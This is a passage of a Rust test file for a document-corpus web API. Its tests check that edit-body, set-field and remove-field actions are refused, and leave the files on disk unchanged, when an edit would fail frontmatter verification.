        written.contains("updated: \"2026-02-03T04:05:06Z\""),
        "{written}"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn edit_body_that_breaks_verify_is_refused_and_writes_nothing() {
    init();
    let fx = Fixture::new();
    write_spec(&fx.live);
    let before = snapshot(&fx.live);

    // The new body drops the required `## Plan` section, which is a *new*
    // verify problem — the gate's whole contract.
    let (status, answer) = fx
        .try_action(json!({
            "action": "edit-body",
            "id": "SPEC-0003",
            "body": "# The spec\n\nAll plan, no Plan.\n"
        }))
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{answer}");
    let message = answer["error"].as_str().unwrap_or_default();
    assert!(message.contains("verify problem"), "{answer}");
    assert!(
        message.contains("Plan"),
        "the refusal names the missing section: {answer}"
    );

    // Refused means *nothing* changed on disk — not the edited file, not the
    // sync pass, not the ledger.
    assert_eq!(
        snapshot(&fx.live),
        before,
        "a refused edit must write nothing"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn set_field_writes_declared_fields_with_the_cli_value_coercion() {
    init();
    let fx = Fixture::new();
    write_spec(&fx.live);

    let answer = fx
        .action(json!({
            "action": "set-field", "id": "SPEC-0003", "key": "priority", "value": "high"
        }))
        .await;
    assert_eq!(answer["id"], "SPEC-0003");
    fx.action(json!({
        "action": "set-field", "id": "SPEC-0003", "key": "estimate", "value": "3"
    }))
    .await;

    let written = std::fs::read_to_string(fx.live.join("inventory/SPEC-0003.md")).unwrap();
    assert!(written.contains("priority: high"), "{written}");
    // The `--field key=value` coercion: `3` for an int field is the int 3,
    // not the string "3" (which the verify gate would refuse).
    assert!(written.contains("estimate: 3"), "{written}");
    assert!(
        written.contains("updated: \"2026-02-03T04:05:06Z\""),
        "a field write stamps updated: {written}"
    );

    // The doc payload exposes the type's declared fields, so the UI can offer
    // them without reading opys.toml itself.
    let (status, doc) = fx
        .get(&format!("/api/corpus/{}/doc/SPEC-0003", fx.cid))
        .await;
    assert_eq!(status, StatusCode::OK);
    let declared = doc["declared_fields"].as_array().expect("declared_fields");
    let priority = declared
        .iter()
        .find(|f| f["name"] == "priority")
        .expect("priority is declared");
    assert_eq!(priority["type"], "enum");
    assert_eq!(priority["values"], json!(["low", "high"]));
}

#[tokio::test(flavor = "multi_thread")]
async fn set_field_that_breaks_verify_is_refused_and_writes_nothing() {
    init();
    let fx = Fixture::new();
    write_spec(&fx.live);
    let before = snapshot(&fx.live);

    // An undeclared key is a *new* verify problem — the closed-frontmatter
    // invariant, enforced by the gate with verify's own message.
    let (status, answer) = fx
        .try_action(json!({
            "action": "set-field", "id": "SPEC-0003", "key": "velocity", "value": "9"
        }))
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{answer}");
    let message = answer["error"].as_str().unwrap_or_default();
    assert!(
        message.contains("unknown frontmatter field"),
        "the refusal is verify's own closed-frontmatter message: {answer}"
    );

    // A declared enum refuses a value outside its set, by name.
    let (status, answer) = fx
        .try_action(json!({
            "action": "set-field", "id": "SPEC-0003", "key": "priority", "value": "medium"
        }))
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{answer}");
    let message = answer["error"].as_str().unwrap_or_default();
    assert!(message.contains("not one of"), "{answer}");

    assert_eq!(
        snapshot(&fx.live),
        before,
        "a refused field write must write nothing"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn set_field_refuses_keys_a_dedicated_action_owns() {
    init();
    let fx = Fixture::new();
    let before = snapshot(&fx.live);

    for (key, redirect) in [
        ("status", "set-status"),
        ("tags", "tag"),
        ("blocked_by", "block"),
        ("updated", "auto-maintained"),
    ] {
        let (status, answer) = fx
            .try_action(json!({
                "action": "set-field", "id": "NOTE-0001", "key": key, "value": "x"
            }))
            .await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{key}: {answer}");
        let message = answer["error"].as_str().unwrap_or_default();
        assert!(
            message.contains(redirect),
            "'{key}' should point at its owner: {answer}"
        );
    }
    assert_eq!(snapshot(&fx.live), before);
}

#[tokio::test(flavor = "multi_thread")]
async fn remove_field_removes_and_a_missing_field_is_named() {
    init();
    let fx = Fixture::new();
    write_spec(&fx.live);
    fx.action(json!({
        "action": "set-field", "id": "SPEC-0003", "key": "priority", "value": "low"
    }))
    .await;

    fx.action(json!({
        "action": "remove-field", "id": "SPEC-0003", "key": "priority"
    }))
    .await;
    let written = std::fs::read_to_string(fx.live.join("inventory/SPEC-0003.md")).unwrap();
    assert!(!written.contains("priority"), "{written}");

    // Removing what is not there is a refusal, not a silent no-op: it is how a
    // typo in the key announces itself.
    let (status, answer) = fx
        .try_action(json!({
            "action": "remove-field", "id": "SPEC-0003", "key": "priority"
        }))
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{answer}");
    assert!(
        answer["error"]
            .as_str()
            .unwrap_or_default()
            .contains("no field 'priority'"),
        "{answer}"
    );
}
